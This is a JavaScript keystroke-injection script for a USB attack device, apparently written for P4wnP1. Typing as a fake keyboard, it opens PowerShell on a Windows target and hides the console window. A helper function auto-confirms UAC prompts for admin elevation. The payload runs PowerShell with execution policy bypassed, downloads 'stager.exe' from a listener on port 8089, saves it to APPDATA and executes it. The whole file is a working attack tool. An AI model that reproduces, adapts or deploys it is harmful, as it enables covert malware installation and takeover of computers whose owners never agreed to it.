/*
PowerShell Execute
Original author: MaMe82
Modified By : Shikaree_Hunter
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"
hide= true; // set to true to hide the console window on the target

// Hide an already opened PowerShell console, but keep input focus, to gon on typing
function hidePS() {
  type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)');
    press("ENTER");
}

// sets typing speed to "natural" (global effect on all running script jobs)
function natural() {
  typingSpeed(100,150)  // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (host architecture)
function startPS() {
  press("GUI r");
  delay(500);
  type("powershell\n")
}


// Uses search bar and CTRL+SHIFT+ENTER to run given program as admin (assumes user is admin, only confirms UAC dialog)
function win10AsAdmin(program) {
  press("GUI"); //open search
  delay(200);
  type(program); //enter target binary
  delay(500); // wait for search to finish
  press("CTRL SHIFT ENTER"); //start with CTRL+SHIFT+ENTER (run as admin)
  delay(500); //wait for confirmation dialog (no check if a password is required, assume login user is admin)
  press("SHIFT TAB"); //switch to dialog confirmation
  press("ENTER");
}

function executepayload() {
    type("powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://0.0.0.0:8089/stager.exe', $env:APPDATA + '\stager.exe'); Start-Process $env:APPDATA'\stager.exe' \n");
    
}

layout('us');     // US keyboard layout
fast();
startPS();
delay(500);
executepayload();
delay(500);
if (hide) { hidePS(); } //hide the console if choosen to do so
